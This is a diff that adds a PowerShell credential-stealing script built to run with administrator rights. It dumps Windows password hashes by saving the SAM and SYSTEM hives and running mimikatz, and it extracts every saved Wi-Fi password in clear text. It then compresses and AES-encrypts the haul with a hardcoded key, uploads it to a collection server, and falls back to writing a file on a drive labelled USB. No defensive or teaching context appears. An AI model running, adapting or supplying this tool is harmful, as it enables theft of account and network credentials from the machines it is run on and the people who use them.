@@ -1,0 +1,105 @@
+#Requires -RunAsAdministrator
+
+# Configuration
+$HOTSPOT_SSID = "-"
+$HOTSPOT_PASS = "narnia123fl0v3V"
+$SERVER_URL = "https://192.168.1.4:443/upload"
+$ENCRYPT_KEY = "YourEncryptionKey123!"
+
+function Get-SystemCredentials {
+    try {
+        # Try to dump Windows password hashes
+        $hashes = (cmd /c "reg save HKLM\SAM sam.save 2>&1 && reg save HKLM\SYSTEM system.save 2>&1")
+        if (Test-Path "sam.save" -and Test-Path "system.save") {
+            $hashes = (.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" 2>&1 | Out-String)
+            Remove-Item sam.save, system.save -Force
+        }
+        return $hashes
+    } catch { return "Windows Hash Dump Failed: $_" }
+}
+
+function Get-WifiCredentials {
+    try {
+        $profiles = (netsh wlan show profiles) | 
+                    Where-Object { $_ -match "All User Profile" } | 
+                    ForEach-Object { $_.Split(":")[1].Trim() }
+        
+        $creds = foreach ($profile in $profiles) {
+            $result = netsh wlan show profile name="$profile" key=clear
+            $password = ($result | Select-String "Key Content").ToString().Split(":")[1].Trim()
+            "SSID: $profile`nPassword: $password`n"
+        }
+        return $creds -join "`n"
+    } catch { return "Wi-Fi Cred Dump Failed: $_" }
+}
+
+function Encrypt-Data {
+    param($data)
+    try {
+        # Convert to bytes
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
+        
+        # Compress
+        $ms = New-Object System.IO.MemoryStream
+        $gzip = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
+        $gzip.Write($bytes, 0, $bytes.Length)
+        $gzip.Close()
+        $compressed = $ms.ToArray()
+        $ms.Close()
+        
+        # Pad to AES block size
+        $blockSize = 16
+        $padLength = $blockSize - ($compressed.Length % $blockSize)
+        if ($padLength -eq 0) { $padLength = $blockSize }
+        $padded = New-Object byte[] ($compressed.Length + $padLength)
+        [Array]::Copy($compressed, $padded, $compressed.Length)
+        for ($i = $compressed.Length; $i -lt $padded.Length; $i++) {
+            $padded[$i] = [byte]$padLength
+        }
+        
+        # Encrypt
+        $aes = New-Object System.Security.Cryptography.AesManaged
+        $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($ENCRYPT_KEY.PadRight(32))
+        $aes.GenerateIV()
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $encryptor = $aes.CreateEncryptor()
+        $encrypted = $encryptor.TransformFinalBlock($padded, 0, $padded.Length)
+        
+        return @{
+            iv = [Convert]::ToBase64String($aes.IV)
+            data = [Convert]::ToBase64String($encrypted)
+        }
+    } catch { return $null }
+}
+
+function Send-DataToServer {
+    param($data)
+    $encrypted = Encrypt-Data $data
+    if ($encrypted -eq $null) { return $false }
+    
+    try {
+        $response = Invoke-WebRequest -Uri $SERVER_URL -Method Post -Body $encrypted -UseBasicParsing
+        return $response.StatusCode -eq 200
+    } catch { return $false }
+}
+
+# Main execution
+$creds = @"
+===== WINDOWS LOGIN HASHES =====
+$(Get-SystemCredentials)
+
+===== WI-FI CREDENTIALS =====
+$(Get-WifiCredentials)
+"@
+
+# Try to send encrypted data
+$success = Send-DataToServer $creds
+
+if (-not $success) {
+    # Fallback: save to USB
+    $creds | Out-File "D:\creds_$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
+}
+
+# Cleanup
+Remove-Variable HOTSPOT_PASS, ENCRYPT_KEY, creds -Force
+[System.GC]::Collect()
